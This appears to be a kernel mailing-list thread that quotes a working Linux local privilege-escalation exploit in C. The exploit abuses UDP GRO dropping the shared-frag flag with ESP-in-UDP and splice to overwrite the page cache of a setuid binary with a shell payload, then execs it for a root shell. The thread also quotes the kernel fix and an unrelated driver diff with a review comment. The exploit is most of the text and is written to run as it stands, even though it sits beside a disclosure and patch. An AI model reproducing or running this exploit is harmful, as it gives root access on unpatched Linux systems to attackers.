-> static struct nlattr *nest_begin(struct nlmsghdr *nlh, size_t max, unsigned short type)
-> {
-> 	size_t off = NLMSG_ALIGN(nlh->nlmsg_len);
-> 	struct nlattr *nla = (struct nlattr *)((char *)nlh + off);
-> 	if (off + NLA_HDRLEN > max) { fprintf(stderr, "nlmsg overflow\n"); exit(2); }
-> 	nla->nla_type = type;
-> 	nla->nla_len = NLA_HDRLEN;
-> 	nlh->nlmsg_len = off + NLA_HDRLEN;
-> 	return nla;
-> }
-> 
-> static void nest_end(struct nlmsghdr *nlh, struct nlattr *nla)
-> {
-> 	nla->nla_len = (unsigned short)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len) - (char *)nla);
-> }
-> 
-> static void nl_talk(struct nlmsghdr *nlh, int proto, const char *label)
-> {
-> 	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
-> 	char resp[4096];
-> 	int fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, proto);
-> 	if (fd < 0) gate_fail(label);
-> 	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) gate_fail(label);
-> 	memset(&sa, 0, sizeof(sa));
-> 	sa.nl_family = AF_NETLINK;
-> 	if (sendto(fd, nlh, nlh->nlmsg_len, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) gate_fail(label);
-> 	ssize_t r = recv(fd, resp, sizeof(resp), 0);
-> 	if (r < 0 || nl_ack_errno(resp, r) < 0) gate_fail(label);
-> 	close(fd);
-> }
-> 
-> /* ---- network setup ---- */
-> 
-> static void if_up(const char *name)
-> {
-> 	struct ifreq ifr = {};
-> 	int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
-> 	if (fd < 0) gate_fail("socket");
-> 	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
-> 	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) gate_fail(name);
-> 	ifr.ifr_flags |= IFF_UP;
-> 	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) gate_fail(name);
-> 	close(fd);
-> }
-> 
-> static void create_veth(void)
-> {
-> 	char buf[4096] = {};
-> 	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
-> 	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtnl_ifinfomsg));
-> 	nlh->nlmsg_type = RTM_NEWLINK;
-> 	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
-> 	((struct rtnl_ifinfomsg *)NLMSG_DATA(nlh))->ifi_family = AF_UNSPEC;
-> 	add_nlattr(nlh, sizeof(buf), IFLA_IFNAME, VETH0, strlen(VETH0) + 1);
-> 	struct nlattr *li = nest_begin(nlh, sizeof(buf), IFLA_LINKINFO | NLA_F_NESTED);
-> 	add_nlattr(nlh, sizeof(buf), IFLA_INFO_KIND, "veth", 5);
-> 	struct nlattr *id = nest_begin(nlh, sizeof(buf), IFLA_INFO_DATA | NLA_F_NESTED);
-> 	struct nlattr *pn = nest_begin(nlh, sizeof(buf), VETH_INFO_PEER | NLA_F_NESTED);
-> 	{ size_t o = NLMSG_ALIGN(nlh->nlmsg_len);
-> 	  memset((char *)nlh + o, 0, sizeof(struct rtnl_ifinfomsg));
-> 	  nlh->nlmsg_len = o + sizeof(struct rtnl_ifinfomsg); }
-> 	add_nlattr(nlh, sizeof(buf), IFLA_IFNAME, VETH1, strlen(VETH1) + 1);
-> 	nest_end(nlh, pn); nest_end(nlh, id); nest_end(nlh, li);
-> 	nl_talk(nlh, NETLINK_ROUTE, "create veth");
-> }
-> 
-> static void move_to_netns(const char *name, pid_t pid)
-> {
-> 	char buf[4096] = {};
-> 	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
-> 	uint32_t ns_pid = (uint32_t)pid;
-> 	unsigned int idx = if_nametoindex(name);
-> 	if (!idx) gate_fail("if_nametoindex");
-> 	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtnl_ifinfomsg));
-> 	nlh->nlmsg_type = RTM_NEWLINK;
-> 	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
-> 	((struct rtnl_ifinfomsg *)NLMSG_DATA(nlh))->ifi_family = AF_UNSPEC;
-> 	((struct rtnl_ifinfomsg *)NLMSG_DATA(nlh))->ifi_index = (int)idx;
-> 	add_nlattr(nlh, sizeof(buf), IFLA_NET_NS_PID, &ns_pid, sizeof(ns_pid));
-> 	nl_talk(nlh, NETLINK_ROUTE, "move veth");
-> }
-> 
-> static void add_addr(const char *name, const char *addr)
-> {
-> 	char buf[4096] = {};
-> 	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
-> 	struct in_addr a;
-> 	unsigned int idx = if_nametoindex(name);
-> 	if (!idx) gate_fail("if_nametoindex");
-> 	inet_pton(AF_INET, addr, &a);
-> 	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct ifaddrmsg));
-> 	nlh->nlmsg_type = RTM_NEWADDR;
-> 	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
-> 	struct ifaddrmsg *ifa = (struct ifaddrmsg *)NLMSG_DATA(nlh);
-> 	ifa->ifa_family = AF_INET;
-> 	ifa->ifa_prefixlen = 24;
-> 	ifa->ifa_index = idx;
-> 	add_nlattr(nlh, sizeof(buf), IFA_LOCAL, &a, sizeof(a));
-> 	add_nlattr(nlh, sizeof(buf), IFA_ADDRESS, &a, sizeof(a));
-> 	nl_talk(nlh, NETLINK_ROUTE, "add addr");
-> }
-> 
-> static void ethtool_set(const char *name, uint32_t cmd, uint32_t data)
-> {
-> 	struct ifreq ifr = {};
-> 	struct { uint32_t cmd; uint32_t data; } val = { cmd, data };
-> 	int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
-> 	if (fd < 0) return;
-> 	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
-> 	ifr.ifr_data = (void *)&val;
-> 	ioctl(fd, SIOCETHTOOL, &ifr);
-> 	close(fd);
-> }
-> 
-> /* ---- XDP attach/detach for NAPI init ---- */
-> 
-> static void xdp_toggle(const char *name, int prog_fd, uint32_t flags)
-> {
-> 	char buf[4096] = {};
-> 	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
-> 	unsigned int idx = if_nametoindex(name);
-> 	if (!idx) return;
-> 	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtnl_ifinfomsg));
-> 	nlh->nlmsg_type = RTM_NEWLINK;
-> 	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
-> 	((struct rtnl_ifinfomsg *)NLMSG_DATA(nlh))->ifi_family = AF_UNSPEC;
-> 	((struct rtnl_ifinfomsg *)NLMSG_DATA(nlh))->ifi_index = (int)idx;
-> 	struct nlattr *x = nest_begin(nlh, sizeof(buf), IFLA_XDP | NLA_F_NESTED);
-> 	add_nlattr(nlh, sizeof(buf), IFLA_XDP_FD, &prog_fd, sizeof(prog_fd));
-> 	add_nlattr(nlh, sizeof(buf), IFLA_XDP_FLAGS, &flags, sizeof(flags));
-> 	nest_end(nlh, x);
-> 	nl_talk(nlh, NETLINK_ROUTE, "xdp");
-> }
-> 
-> static void enable_veth_napi(const char *name)
-> {
-> 	struct bpf_insn { uint8_t code; uint8_t regs; int16_t off; int32_t imm; };
-> 	struct bpf_insn prog[] = { { 0xb7, 0, 0, 2 }, { 0x95, 0, 0, 0 } };
-> 	struct { uint32_t t; uint32_t c; uint64_t i; uint64_t l;
-> 		 uint32_t a,b; uint64_t d; uint32_t e,f; char n[16]; } attr = {};
-> 	static const char lic[] = "GPL";
-> 	attr.t = 6; attr.c = 2;
-> 	attr.i = (uint64_t)(unsigned long)prog;
-> 	attr.l = (uint64_t)(unsigned long)lic;
-> 	int fd = (int)syscall(__NR_bpf, 5, &attr, sizeof(attr));
-> 	if (fd < 0) return;
-> 	xdp_toggle(name, fd, XDP_FLAGS_SKB_MODE);
-> 	close(fd);
-> 	int m1 = -1;
-> 	xdp_toggle(name, m1, XDP_FLAGS_SKB_MODE);
-> }
-> 
-> /* ---- user namespace ---- */
-> 
-> static void setup_userns(void)
-> {
-> 	uid_t uid = getuid();
-> 	gid_t gid = getgid();
-> 	int rp[2], mp[2];
-> 	if (pipe(rp) < 0 || pipe(mp) < 0) die("pipe");
-> 	pid_t c = fork();
-> 	if (c < 0) die("fork");
-> 	if (c == 0) {
-> 		char path[64], map[64]; pid_t pp = getppid();
-> 		close(rp[1]); close(mp[0]); sync_read(rp[0]);
-> 		snprintf(path, sizeof(path), "/proc/%d/setgroups", pp);
-> 		int fd = open(path, O_WRONLY); if (fd >= 0) { write(fd, "deny", 4); close(fd); }
-> 		snprintf(path, sizeof(path), "/proc/%d/uid_map", pp);
-> 		snprintf(map, sizeof(map), "0 %u 1\n", uid);
-> 		fd = open(path, O_WRONLY); if (fd >= 0) { write(fd, map, strlen(map)); close(fd); }
-> 		snprintf(path, sizeof(path), "/proc/%d/gid_map", pp);
-> 		snprintf(map, sizeof(map), "0 %u 1\n", gid);
-> 		fd = open(path, O_WRONLY); if (fd >= 0) { write(fd, map, strlen(map)); close(fd); }
-> 		sync_write(mp[1]); _exit(0);
-> 	}
-> 	close(rp[0]); close(mp[1]);
-> 	if (unshare(CLONE_NEWUSER) < 0) gate_fail("unshare(CLONE_NEWUSER)");
-> 	sync_write(rp[1]); sync_read(mp[0]); waitpid(c, NULL, 0);
-> 	setresgid(0, 0, 0); setresuid(0, 0, 0);
-> }
-> 
-> /* ---- XFRM SA ---- */
-> 
-> static void add_sa(void)
-> {
-> 	char buf[4096] = {};
-> 	char ab[sizeof(struct xfrm_algo_aead) + sizeof(xfrm_key)];
-> 	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
-> 	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));
-> 	nlh->nlmsg_type = XFRM_MSG_NEWSA;
-> 	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
-> 	struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
-> 	xs->sel.family = AF_INET;
-> 	inet_pton(AF_INET, ADDR_SRC, &xs->saddr.a4);
-> 	inet_pton(AF_INET, ADDR_DST, &xs->id.daddr.a4);
-> 	xs->id.spi = htonl(ESP_SPI); xs->id.proto = IPPROTO_ESP;
-> 	xs->family = AF_INET; xs->mode = XFRM_MODE_TRANSPORT; xs->replay_window = 0;
-> 	xs->lft.soft_byte_limit = xs->lft.hard_byte_limit = XFRM_INF;
-> 	xs->lft.soft_packet_limit = xs->lft.hard_packet_limit = XFRM_INF;
-> 	memset(ab, 0, sizeof(ab));
-> 	struct xfrm_algo_aead *a = (struct xfrm_algo_aead *)ab;
-> 	strcpy(a->alg_name, "rfc4106(gcm(aes))");
-> 	a->alg_key_len = sizeof(xfrm_key) * 8;
-> 	a->alg_icv_len = ICV_LEN * 8;
-> 	memcpy(a->alg_key, xfrm_key, sizeof(xfrm_key));
-> 	add_nlattr(nlh, sizeof(buf), XFRMA_ALG_AEAD, ab, sizeof(ab));
-> 	struct xfrm_encap_tmpl encap = {};
-> 	encap.encap_type = UDP_ENCAP_ESPINUDP;
-> 	encap.encap_sport = htons(UDP_PORT);
-> 	encap.encap_dport = htons(UDP_PORT);
-> 	add_nlattr(nlh, sizeof(buf), XFRMA_ENCAP, &encap, sizeof(encap));
-> 	nl_talk(nlh, NETLINK_XFRM, "add SA");
-> }
-> 
-> /* ---- AES-GCM keystream ---- */
-> 
-> static void aes_ecb_block(int alg_fd, const unsigned char in[16], unsigned char out[16])
-> {
-> 	char cb[CMSG_SPACE(sizeof(uint32_t))] = {};
-> 	struct iovec iov = { (void *)in, 16 };
-> 	struct msghdr msg = { .msg_iov = &iov, .msg_iovlen = 1, .msg_control = cb, .msg_controllen = sizeof(cb) };
-> 	uint32_t op = ALG_OP_ENCRYPT;
-> 	struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
-> 	cm->cmsg_level = SOL_ALG; cm->cmsg_type = ALG_SET_OP;
-> 	cm->cmsg_len = CMSG_LEN(sizeof(op));
-> 	memcpy(CMSG_DATA(cm), &op, sizeof(op));
-> 	int ofd = accept4(alg_fd, NULL, NULL, SOCK_CLOEXEC);
-> 	if (ofd < 0) die("AF_ALG accept");
-> 	if (sendmsg(ofd, &msg, 0) != 16) die("AF_ALG send");
-> 	if (read(ofd, out, 16) != 16) die("AF_ALG read");
-> 	close(ofd);
-> }
-> 
-> /*
->  * rfc4106 shifts the 8-byte ESP IV into the AAD, so the inner GCM
->  * ciphertext starts at frag byte 0. The target byte is at CTR position 0.
->  */
-> #define KS_POS 0
-> 
-> static uint16_t stream_nonce[256];
-> static bool stream_have[256];
-> 
-> static void build_stream_table(void)
-> {
-> 	struct sockaddr_alg sa = { .salg_family = AF_ALG };
-> 	strcpy((char *)sa.salg_type, "skcipher");
-> 	strcpy((char *)sa.salg_name, "ecb(aes)");
-> 	int fd = socket(AF_ALG, SOCK_SEQPACKET | SOCK_CLOEXEC, 0);
-> 	if (fd < 0) die("AF_ALG");
-> 	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) die("AF_ALG bind");
-> 	if (setsockopt(fd, SOL_ALG, ALG_SET_KEY, xfrm_key, 16) < 0) die("AF_ALG key");
-> 
-> 	unsigned int count = 0;
-> 	for (unsigned nonce = 0; nonce <= 0xffff && count < 256; nonce++) {
-> 		unsigned char iv[8], cb[16], out[16];
-> 		memset(iv, 0xcc, sizeof(iv));
-> 		store_be32(iv + 4, nonce);
-> 		memcpy(cb, &xfrm_key[16], 4);
-> 		memcpy(cb + 4, iv, 8);
-> 		store_be32(cb + 12, 2 + KS_POS / 16);
-> 		aes_ecb_block(fd, cb, out);
-> 		unsigned char b = out[KS_POS % 16];
-> 		if (stream_have[b]) continue;
-> 		stream_have[b] = true;
-> 		stream_nonce[b] = (uint16_t)nonce;
-> 		count++;
-> 	}
-> 	close(fd);
-> 	if (count < 256) { fprintf(stderr, "incomplete stream table: %u/256\n", count); exit(2); }
-> }
-> 
-> /* ---- main ---- */
-> 
-> int main(void)
-> {
-> 	setvbuf(stdout, NULL, _IONBF, 0);
-> 
-> 	printf("[*] uid=%d euid=%d gid=%d egid=%d\n",
-> 	       getuid(), geteuid(), getgid(), getegid());
-> 	printf("[*] mode=gro_espinudp_pagecache_replace\n\n");
-> 
-> 	struct stat st;
-> 	if (stat(target_file, &st) < 0 || !S_ISREG(st.st_mode) || st.st_size < PAYLOAD_LEN + SPLICE_LEN)
-> 		die("stat target");
-> 
-> 	printf("[*] target=%s size=%lld\n", target_file, (long long)st.st_size);
-> 
-> 	build_stream_table();
-> 	printf("[*] stream_table=256 entries at ciphertext position %d\n", KS_POS);
-> 
-> 	/*
-> 	 * Fork before entering the user namespace. The child enters the
-> 	 * user/net namespace and does all the page-cache corruption. The
-> 	 * parent stays in the init user namespace so that execve() of the
-> 	 * corrupted setuid su binary honors the setuid bit, giving a real
-> 	 * root shell rather than a fake namespace-root shell.
-> 	 */
-> 	fflush(stdout); fflush(stderr);
-> 	pid_t worker = fork();
-> 	if (worker < 0) die("fork worker");
-> 	if (worker > 0) {
-> 		int wstatus;
-> 		waitpid(worker, &wstatus, 0);
-> 		if (WIFEXITED(wstatus) && WEXITSTATUS(wstatus) == 1) {
-> 			char *argv[] = { (char *)target_file, NULL };
-> 			char *envp[] = { NULL };
-> 			execve(target_file, argv, envp);
-> 		}
-> 		return WIFEXITED(wstatus) ? WEXITSTATUS(wstatus) : 2;
-> 	}
-> 
-> 	/* Child: enter user namespace and do the corruption */
-> 	if (getuid() != 0) setup_userns();
-> 	if (unshare(CLONE_NEWNET) < 0) gate_fail("unshare(CLONE_NEWNET)");
-> 	if_up("lo");
-> 	create_veth();
-> 
-> 	int p_ns[2], p_veth[2], p_rdy[2];
-> 	if (pipe(p_ns) < 0 || pipe(p_veth) < 0 || pipe(p_rdy) < 0) die("pipe");
-> 	fflush(stdout); fflush(stderr);
-> 
-> 	pid_t rx = fork();
-> 	if (rx < 0) die("fork");
-> 
-> 	if (rx == 0) {
-> 		close(p_ns[0]); close(p_veth[1]); close(p_rdy[0]);
-> 		if (unshare(CLONE_NEWNET) < 0) gate_fail("unshare(CLONE_NEWNET)");
-> 		if (unshare(CLONE_NEWNS) < 0) gate_fail("unshare(CLONE_NEWNS)");
-> 		mount("", "/", NULL, MS_PRIVATE | MS_REC, NULL);
-> 		mount("sysfs", "/sys", "sysfs", 0, NULL);
-> 		sync_write(p_ns[1]); close(p_ns[1]);
-> 		sync_read(p_veth[0]); close(p_veth[0]);
-> 		if_up("lo");
-> 		ethtool_set(VETH1, ETHTOOL_SGRO, 1);
-> 		if_up(VETH1);
-> 		enable_veth_napi(VETH1);
-> 		add_addr(VETH1, ADDR_DST);
-> 		add_sa();
-> 		int ufd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
-> 		if (ufd < 0) gate_fail("socket");
-> 		struct sockaddr_in ba = { .sin_family = AF_INET, .sin_port = htons(UDP_PORT) };
-> 		inet_pton(AF_INET, ADDR_DST, &ba.sin_addr);
-> 		if (bind(ufd, (struct sockaddr *)&ba, sizeof(ba)) < 0) gate_fail("bind");
-> 		int et = UDP_ENCAP_ESPINUDP, gro = 1;
-> 		setsockopt(ufd, IPPROTO_UDP, UDP_ENCAP, &et, sizeof(et));
-> 		setsockopt(ufd, IPPROTO_UDP, UDP_GRO, &gro, sizeof(gro));
-> 		sync_write(p_rdy[1]);
-> 		pause();
-> 		_exit(0);
-> 	}
-> 
-> 	close(p_ns[1]); close(p_veth[0]); close(p_rdy[1]);
-> 	sync_read(p_ns[0]); close(p_ns[0]);
-> 	move_to_netns(VETH1, rx);
-> 	sync_write(p_veth[1]); close(p_veth[1]);
-> 	if_up(VETH0); add_addr(VETH0, ADDR_SRC);
-> 	ethtool_set(VETH0, ETHTOOL_STSO, 0);
-> 	ethtool_set(VETH0, ETHTOOL_SGSO, 0);
-> 
-> 	/*
-> 	 * Add a netem delay on the sender veth so both datagrams sit in the
-> 	 * qdisc until the timer fires, then get released into veth_xmit()
-> 	 * within the same softirq context. This guarantees both land in one
-> 	 * NAPI poll cycle for GRO to merge them, without needing sysfs
-> 	 * gro_flush_timeout (which requires capable(CAP_NET_ADMIN) in the
-> 	 * init namespace). tc uses netlink with ns_capable(), so it works
-> 	 * from a user namespace.
-> 	 */
-> 	if (system("tc qdisc add dev " VETH0 " root netem delay 20ms") != 0)
-> 		gate_fail("tc netem");
-> 	usleep(50000);
-> 
-> 	sync_read(p_rdy[0]); close(p_rdy[0]);
-> 
-> 	int sock = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
-> 	if (sock < 0) die("socket");
-> 	struct sockaddr_in sa = { .sin_family = AF_INET, .sin_port = htons(UDP_PORT) };
-> 	struct sockaddr_in da = { .sin_family = AF_INET, .sin_port = htons(UDP_PORT) };
-> 	inet_pton(AF_INET, ADDR_SRC, &sa.sin_addr);
-> 	inet_pton(AF_INET, ADDR_DST, &da.sin_addr);
-> 	bind(sock, (struct sockaddr *)&sa, sizeof(sa));
-> 	connect(sock, (struct sockaddr *)&da, sizeof(da));
-> 
-> 	int target_fd = open(target_file, O_RDONLY | O_CLOEXEC);
-> 	if (target_fd < 0) die("open target");
-> 
-> 	uint32_t seq = 1;
-> 	size_t total_changed = 0;
-> 	int delay_ms = 20;
-> 	int sleep_us = 40000;
-> 	struct timespec last_ok;
-> 	clock_gettime(CLOCK_MONOTONIC, &last_ok);
-> 
-> 	printf("[*] replacing %d bytes starting at offset 0\n", PAYLOAD_LEN);
-> 
-> 	/* Warmup: send a dummy pair to prime the netem/NAPI path */
-> 	{
-> 		unsigned char w[16 + SPLICE_LEN];
-> 		memset(w, 0, sizeof(w));
-> 		store_be32(w, ESP_SPI);
-> 		store_be32(w + 4, seq++);
-> 		send(sock, w, sizeof(w), 0);
-> 		store_be32(w + 4, seq++);
-> 		send(sock, w, sizeof(w), 0);
-> 		usleep(sleep_us);
-> 	}
-> 
-> 	for (int pass = 0; ; pass++) {
-> 		size_t pass_changed = 0, remaining = 0;
-> 
-> 		for (int idx = 0; idx < PAYLOAD_LEN; idx++) {
-> 			unsigned char cur = read_byte_at(target_fd, idx);
-> 			if (cur == shell_elf[idx])
-> 				continue;
-> 			remaining++;
-> 
-> 			unsigned char need_ks = cur ^ shell_elf[idx];
-> 			uint16_t nonce = stream_nonce[need_ks];
-> 			unsigned char iv[8];
-> 			memset(iv, 0xcc, sizeof(iv));
-> 			store_be32(iv + 4, nonce);
-> 
-> 			unsigned char hdr[16];
-> 			char hp[] = "/tmp/fgro-XXXXXX";
-> 			int hfd = mkstemp(hp); unlink(hp);
-> 			store_be32(hdr, ESP_SPI); store_be32(hdr + 4, seq++);
-> 			memcpy(hdr + 8, iv, 8);
-> 			write(hfd, hdr, 16);
-> 
-> 			int pfd[2];
-> 			pipe(pfd);
-> 			loff_t ho = 0;
-> 			splice(hfd, &ho, pfd[1], NULL, 16, 0);
-> 			loff_t so = (loff_t)idx;
-> 			splice(target_fd, &so, pfd[1], NULL, SPLICE_LEN, 0);
-> 			close(hfd);
-> 
-> 			unsigned char p1[16 + SPLICE_LEN];
-> 			store_be32(p1, ESP_SPI); store_be32(p1 + 4, seq++);
-> 			memcpy(p1 + 8, iv, 8);
-> 			memset(p1 + 16, 0x41, SPLICE_LEN);
-> 			send(sock, p1, sizeof(p1), 0);
-> 
-> 			int cork = 1;
-> 			setsockopt(sock, IPPROTO_UDP, UDP_CORK, &cork, sizeof(cork));
-> 			splice(pfd[0], NULL, sock, NULL, 16 + SPLICE_LEN, 0);
-> 			cork = 0;
-> 			setsockopt(sock, IPPROTO_UDP, UDP_CORK, &cork, sizeof(cork));
-> 			close(pfd[0]); close(pfd[1]);
-> 
-> 			usleep(sleep_us);
-> 
-> 			unsigned char got = read_byte_at(target_fd, idx);
-> 			if (got == shell_elf[idx]) {
-> 				total_changed++;
-> 				pass_changed++;
-> 				clock_gettime(CLOCK_MONOTONIC, &last_ok);
-> 				printf("\r[+] byte %3d/%-3d  0x%02x -> 0x%02x  ok  (%zu changed)",
-> 				       idx, PAYLOAD_LEN, cur, got, total_changed);
-> 			} else {
-> 				printf("\r[-] byte %3d/%-3d  0x%02x -> 0x%02x (want 0x%02x) MISS",
-> 				       idx, PAYLOAD_LEN, cur, got, shell_elf[idx]);
-> 			}
-> 			fflush(stdout);
-> 		}
-> 
-> 		if (remaining == 0)
-> 			break;
-> 
-> 		size_t still_wrong = 0;
-> 		for (int idx = 0; idx < PAYLOAD_LEN; idx++)
-> 			if (read_byte_at(target_fd, idx) != shell_elf[idx])
-> 				still_wrong++;
-> 
-> 		if (still_wrong == 0)
-> 			break;
-> 
-> 		struct timespec now;
-> 		clock_gettime(CLOCK_MONOTONIC, &now);
-> 		long elapsed = (now.tv_sec - last_ok.tv_sec) * 1000 +
-> 			       (now.tv_nsec - last_ok.tv_nsec) / 1000000;
-> 		if (elapsed > 30000) {
-> 			printf("\n[!] %zu bytes stuck after 30s without progress\n",
-> 			       still_wrong);
-> 			break;
-> 		}
-> 
-> 		if (delay_ms < 500) {
-> 			delay_ms = delay_ms < 250 ? delay_ms * 2 : 500;
-> 			sleep_us = delay_ms * 2000;
-> 			char cmd[128];
-> 			snprintf(cmd, sizeof(cmd),
-> 				 "tc qdisc change dev " VETH0 " root netem delay %dms",
-> 				 delay_ms);
-> 			system(cmd);
-> 		}
-> 		printf("\n[*] pass %d: %zu ok, %zu still wrong, delay now %dms, retrying\n",
-> 		       pass + 1, pass_changed, still_wrong, delay_ms);
-> 		fflush(stdout);
-> 	}
-> 
-> 	close(target_fd);
-> 	close(sock);
-> 	kill(rx, SIGTERM);
-> 	waitpid(rx, NULL, 0);
-> 
-> 	/* Final verification: count how many bytes match shell_elf */
-> 	int final_fd = open(target_file, O_RDONLY | O_CLOEXEC);
-> 	size_t matching = 0;
-> 	if (final_fd >= 0) {
-> 		for (int i = 0; i < PAYLOAD_LEN; i++)
-> 			if (read_byte_at(final_fd, i) == shell_elf[i])
-> 				matching++;
-> 		close(final_fd);
-> 	}
-> 
-> 	printf("\n\n");
-> 	if (total_changed > 0) {
-> 		printf("VULNERABLE: %zu/%d payload bytes now match shell_elf "
-> 		       "(%zu written via GRO flag-strip)\n",
-> 		       matching, PAYLOAD_LEN, total_changed);
-> 		_exit(1);
-> 	}
-> 
-> 	printf("FIXED: 0/%d bytes changed\n", PAYLOAD_LEN);
-> 	_exit(0);
-> }
-
-> From c3ec785f197bf329c443aa547eb70864e2ef29ac Mon Sep 17 00:00:00 2001
-> From: Sultan Alsawaf <sultan@kerneltoast.com>
-> Date: Wed, 13 May 2026 21:47:51 -0700
-> Subject: [PATCH] net: gro: propagate SKBFL_SHARED_FRAG in skb_gro_receive()
-> 
-> skb_gro_receive() moves frag descriptors from the incoming skb to the
-> GRO accumulator through two frag-transfer paths (the direct frag-move
-> loop and the head_frag + memcpy path) without propagating the
-> SKBFL_SHARED_FRAG flag from the incoming skb's shinfo->flags. As a
-> result, the accumulator ends up holding references to externally owned
-> or page-cache-backed pages while reporting skb_has_shared_frag() as
-> false.
-> 
-> This is the same bug class as CVE-2026-46300 (d8cfbcdd07557, "net:
-> skbuff: propagate shared-frag marker through frag-transfer helpers"),
-> which fixed the identical omission in __pskb_copy_fclone(),
-> skb_try_coalesce(), and skb_shift(). skb_gro_receive() was missed in
-> that fix since it lives in net/core/gro.c rather than net/core/skbuff.c.
-> 
-> The impact is observable through ESP-over-UDP with UDP GRO: splice()
-> attaches page-cache pages to a UDP skb, setting SKBFL_SHARED_FRAG via
-> ip_append_page(). When two such datagrams are GRO-merged via
-> skb_gro_receive(), the flag is dropped. After udp_rcv_segment()
-> re-segments the merged GSO skb, the fresh segments carry the
-> page-cache frags without the shared-frag marker. esp_input() then sees
-> !skb_cloned() && !skb_has_shared_frag() and takes the skip_cow fast
-> path, decrypting in place over the page-cache pages. Because AES-GCM
-> CTR decryption runs before the authentication tag is verified, the
-> page cache is corrupted even though the tag check subsequently fails.
-> 
-> Fix it by propagating SKBFL_SHARED_FRAG from the incoming skb to the
-> accumulator in both frag-transfer paths, matching what the skbuff.c
-> helpers already do. The third path (frag_list merge at the "merge:"
-> label) chains the entire incoming skb onto the accumulator's frag_list
-> without moving individual frag descriptors, so each sub-skb retains
-> its own flags and no propagation is needed there.
-> 
-> Fixes: cef401de7be8 ("net: fix possible wrong checksum generation")
-> Fixes: f4c50a4034e6 ("xfrm: esp: avoid in-place decrypt on shared skb frags")
-> Cc: stable@vger.kernel.org
-> Co-authored-by: Claude Opus 4.6 (1M context) <noreply@anthropic.com>
-> Signed-off-by: Sultan Alsawaf <sultan@kerneltoast.com>
-> ---
->  net/core/gro.c | 4 ++++
->  1 file changed, 4 insertions(+)
-> 
-> diff --git a/net/core/gro.c b/net/core/gro.c
-> index 31d21de5b15a7..4ac41ced13aeb 100644
-> --- a/net/core/gro.c
-> +++ b/net/core/gro.c
-> @@ -145,6 +145,8 @@ int skb_gro_receive(struct sk_buff *p, struct sk_buff *skb)
->  		skb_frag_off_add(frag, offset);
->  		skb_frag_size_sub(frag, offset);
->  
-> +		pinfo->flags |= skbinfo->flags & SKBFL_SHARED_FRAG;
+> diff --git a/drivers/net/ethernet/wangxun/libwx/wx_err.c b/drivers/net/ethernet/wangxun/libwx/wx_err.c
+> new file mode 100644
+> index 000000000000..bb61355447a8
+> --- /dev/null
+> +++ b/drivers/net/ethernet/wangxun/libwx/wx_err.c
+> @@ -0,0 +1,154 @@
+> +// SPDX-License-Identifier: GPL-2.0
+> +/* Copyright (c) 2015 - 2026 Beijing WangXun Technology Co., Ltd. */
+> +/* Copyright (c) 1999 - 2026 Intel Corporation. */
 > +
->  		/* all fragments truesize : remove (head size + sk_buff) */
->  		new_truesize = SKB_TRUESIZE(skb_end_offset(skb));
->  		delta_truesize = skb->truesize - new_truesize;
-> @@ -176,6 +178,8 @@ int skb_gro_receive(struct sk_buff *p, struct sk_buff *skb)
->  		memcpy(frag + 1, skbinfo->frags, sizeof(*frag) * skbinfo->nr_frags);
->  		/* We dont need to clear skbinfo->nr_frags here */
->  
-> +		pinfo->flags |= skbinfo->flags & SKBFL_SHARED_FRAG;
+> +#include <linux/netdevice.h>
+> +#include <linux/pci.h>
 > +
->  		new_truesize = SKB_DATA_ALIGN(sizeof(struct sk_buff));
->  		delta_truesize = skb->truesize - new_truesize;
->  		skb->truesize = new_truesize;
-> -- 
-> 2.54.0
-> 
+> +#include "wx_type.h"
+> +#include "wx_lib.h"
+> +#include "wx_err.h"
+> +
+> +void wx_reset_subtask(struct wx *wx)
+> +{
+> +	if (!test_bit(WX_FLAG_NEED_PF_RESET, wx->flags))
+> +		return;
+> +
+> +	rtnl_lock();
+> +
+> +	if (!netif_running(wx->netdev) ||
+> +	    test_bit(WX_STATE_RESETTING, wx->state))
+> +		goto out;
+> +
+> +	wx_warn(wx, "Reset adapter.\n");
+> +
+> +	if (test_and_clear_bit(WX_FLAG_NEED_PF_RESET, wx->flags)) {
+> +		if (wx->do_reset)
+> +			wx->do_reset(wx->netdev);
+> +	}
+> +
+> +out:
+> +	rtnl_unlock();
+> +}
+> +EXPORT_SYMBOL(wx_reset_subtask);
+
+[Critical]
+Can wx_reset_subtask() deadlock against itself on ngbe?
+
+wx_reset_subtask() runs as the first step of ngbe_service_task and
+synchronously calls wx->do_reset(), which for ngbe is bound to
+ngbe_do_reset():
+
+  ngbe_sw_init():
+      wx->do_reset = ngbe_do_reset;
+
+  ngbe_do_reset():
+      if (netif_running(netdev))
+          ngbe_reinit_locked(wx);
+
